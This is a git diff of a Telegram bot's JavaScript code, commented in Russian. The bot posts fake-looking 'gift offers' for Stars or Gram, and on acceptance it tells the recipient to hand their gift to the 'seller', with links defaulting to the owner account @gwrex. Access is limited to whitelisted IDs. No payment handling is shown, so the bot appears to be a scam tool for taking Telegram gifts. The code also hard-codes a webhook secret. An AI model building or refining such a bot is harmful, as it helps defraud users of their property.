@@ -1,7 +1,6 @@
 const ADMIN_ID = 5151757168; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
-// Обновил ID (добавил 8614618729)
 const ALLOWED_IDS = [
   5151757168, 
   9021098137, 
@@ -43,7 +42,6 @@ export default {
           const denyText = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
           await callApi("sendMessage", { chat_id: chatId, text: denyText, parse_mode: "HTML" }, BOT_TOKEN);
         } else {
-          // ТЕКСТ ИЗ ТВОЕГО СКРИНШОТА
           const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. Передача подарка возможна только после проверки условий сделки\n4. После подтверждения передачи и оплаты система обновляет статус\n5. Сделка считается завершённой после проверки передачи и оплаты\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
           
           const startMarkup = {
@@ -92,10 +90,9 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        const sellerUsername = iq.from.username || "";
-        const sellerId = iq.from.id;
-        const sellerRef = sellerUsername ? sellerUsername : sellerId;
-
+        // БЕРЕМ НИК ПРОДАВЦА. Если ника нет - используем gwrex (чтобы кнопка работала)
+        const sellerUsername = iq.from.username || "gwrex";
+        
         const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
         const results = [{
@@ -106,7 +103,8 @@ export default {
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerRef}` }],
+              // В кнопку зашиваем НИК продавца (безопасно для Telegram)
+              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}` }],
               [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
           }
@@ -119,7 +117,6 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
-        // --- ИНСТРУКЦИЯ "КАК ПРИНЯТЬ ОФФЕР" ---
         if (cq.data === "how_to_accept") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
@@ -136,7 +133,6 @@ export default {
           }
         }
 
-        // --- ВОЗВРАТ НАЗАД К "КАК ЭТО РАБОТАЕТ" ---
         if (cq.data === "back_to_start") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
@@ -153,28 +149,21 @@ export default {
           }
         }
 
-        // --- ОФФЕРЫ (ПРИНЯТЬ / ОТКЛОНИТЬ) ---
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
             
           const dataParts = cq.data.split("|");
           const action = dataParts[0];
           const amount = dataParts[1] || "0";
           const currencyType = dataParts[2] || "stars";
-          const sellerRef = dataParts[3] || ""; 
+          const sellerUsername = dataParts[3] || "gwrex"; // Ник продавца
           const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
 
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
 
-          let sellerLink = "https://t.me/gwrex"; 
-          if (sellerRef) {
-              if (isNaN(sellerRef)) {
-                  sellerLink = "https://t.me/" + sellerRef;
-              } else {
-                  sellerLink = `tg://user?id=${sellerRef}`;
-              }
-          }
+          // ССЫЛКА НА ПРОФИЛЬ ПРОДАВЦА (ВСЕГДА HTTPS!)
+          const sellerLink = "https://t.me/" + sellerUsername;
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
@@ -188,6 +177,7 @@ export default {
             
             newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу.`;
             newMarkup = { 
+              // Кнопка ведет на профиль ПРОДАВЦА
               inline_keyboard: [[{ text: "🎁 Передать подарок", url: sellerLink }]] 
             };
           } else {
